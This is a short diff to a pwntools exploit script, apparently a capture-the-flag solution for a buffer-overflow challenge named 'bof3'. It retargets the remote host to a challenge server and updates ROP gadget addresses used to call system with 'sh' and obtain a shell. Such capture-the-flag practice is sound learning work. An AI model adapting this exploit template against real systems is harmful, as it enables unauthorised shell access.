@@ -3,7 +3,7 @@ from pwn import *
 path = './bof3'
 # Open local process for debugging
 if args.REMOTE:
-    p = remote('localhost', 1303)
+    p = remote('challs.hats.sg', 1303)
 else:
     p = process(path)
 # Open the file as a ELF so that we can extract information
@@ -18,9 +18,9 @@ binsh = next(e.search('sh'))
 system = e.symbols['system']
 
 # `pop rdi; ret` gadget
-pop_rdi_ret = 0x4011fb
+pop_rdi_ret = 0x4012bb
 # `pop rsi; pop r15; ret` gadget
-pop_rsi_pop_r15_ret = 0x4011f9
+pop_rsi_pop_r15_ret = 0x4012b9
 
 # fill up `buf1`
 payload = 'a' * 0x20
